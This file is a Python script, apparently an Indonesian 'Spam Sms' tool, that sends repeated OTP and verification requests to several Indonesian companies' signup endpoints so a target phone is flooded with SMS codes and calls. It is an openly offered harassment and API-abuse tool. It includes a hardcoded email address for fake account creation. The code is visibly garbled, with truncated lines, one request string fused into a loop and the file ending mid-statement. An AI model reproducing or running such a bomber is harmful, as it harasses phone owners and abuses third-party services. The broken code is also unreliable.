# belajar
import requests as reek,json,os,time,requests
try:
        import pyfiglet
except:
        os.system("pip install pyfiglet")
req=reek.Session()
os.system('clear')
title=pyfiglet.figlet_format("Spam Sms")
p = "\33[37;1m"
h = "\33[32;1m"
m = "\33[31;1m"
ber=0
gag=0
class nyepam:
        def __init__(self,_8,_08,_62):
                self._8,self._08,self._62=_8,_08,_62
        def mulai(self,asu):
                try:for x in range(asu):
                                send=req.post("https://cmsapi.mapclub.com/api/signup-otp",data={"phone":self._08},headers={"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi>
                                if "ok" in send:break
                                else:break
                        for x in range(asu):
                                send=req.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=json.dumps({"ketik":0,"nomor":"0"+self._8}),headers={"content-type": "application/json; charset=UTF-8","content-length": "34","accept-encoding": "gzip","user-agent">
                                if "Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok." in send:break
                                else:break
                        for x in range(asu):
                                send=json.loads(reek.get(f"https://id.jagreward.com/member/verify-mobile/{self._8}").text)
                                if send["message"]=="Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.":continue
                                else:break
                        for x in range(asu):
                                send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":self._08},headers={"Host": "tokomanamana.com","Connection": "keep-alifor x in range(asu):
                                a=reek.get("https://www.matahari.com/customer/account/create/")
                                b=a.cookies["PHPSESSID"]
                                send=req.post("https://www.matahari.com/rest/V1/thorCustomers",data=json.dumps({"thor_customer":{"name":" Kang Pacman","card_number":False,"email_address":"aapafandi01@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":>
                                if "Success" in send:continue
                                else:break
                        for x in range(asu):
                                send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":self._08},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X->
                                if "Kode OTP berhasil dikirim!" in send:continue
                                else:break
                        bingung()
                except reek.exceptions.ReadTimeout:exit(f"{m}[!] Kesalahan Pada Koneksi")
                except reek.exceptions.ConnectionError:exit(f"{m}[!] Kesalahan Pada Koneksi")
                except (KeyboardInterrupt,EOFError):exit("[!] Exit")
__import__("os").system("clear")
def bingung():
        print(f"{h}\n[√] Semua Spam Terkirim Berhasil{p}\n")
        print(f"Ingin Spam Lagi?\nKetik y untuk ya ketik t untuk tidak\n")
        pilih=input("y/t : ")
        if
